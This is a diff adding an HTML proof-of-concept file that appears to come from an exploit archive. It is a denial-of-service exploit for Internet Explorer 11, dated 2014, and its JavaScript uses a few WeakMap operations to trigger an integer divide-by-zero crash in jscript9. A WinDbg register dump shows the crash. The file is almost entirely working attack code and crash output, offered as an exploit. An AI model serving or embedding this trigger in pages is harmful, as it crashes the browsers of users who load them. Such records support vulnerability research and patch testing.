@@ -1,0 +1,32 @@
+<!--
+# Exploit title: Microsoft Internet Explorer 11 - WeakMap Integer
+divide-by-zero DoS
+# Date: 29.05.2014
+# Vulnerable version: 11
+# Tested on: Windows 7/8
+# Author: Pawel Wylecial
+# http://h0wl.pl @h0wlu
+-->
+
+<html>
+<script>
+var a = [new WeakMap];
+a.push(new WeakMap);
+a[1].set(a[0], a[1]);
+a[0].delete(a[0]);
+</script>
+</html>
+
+<!--
+(674.2408): Integer divide-by-zero - code c0000094 (!!! second chance !!!)
+eax=0087e241 ebx=04598cc0 ecx=04598cc8 edx=00000000 esi=04598cc8
+edi=041f1aa0
+eip=668756f0 esp=05b4b8ac ebp=05b4b8bc iopl=0 nv up ei pl nz na pe
+nc
+cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b
+efl=00010206
+jscript9!JsUtil::WeaklyReferencedKeyDictionary<Js::DynamicObject,bool,RecyclerPointerComparer<Js::DynamicObject
+const *>,1>::TryGetValueAndRemove+0x1f:
+668756f0 f736 div eax,dword ptr [esi]
+ds:002b:04598cc8=00000000
+-->
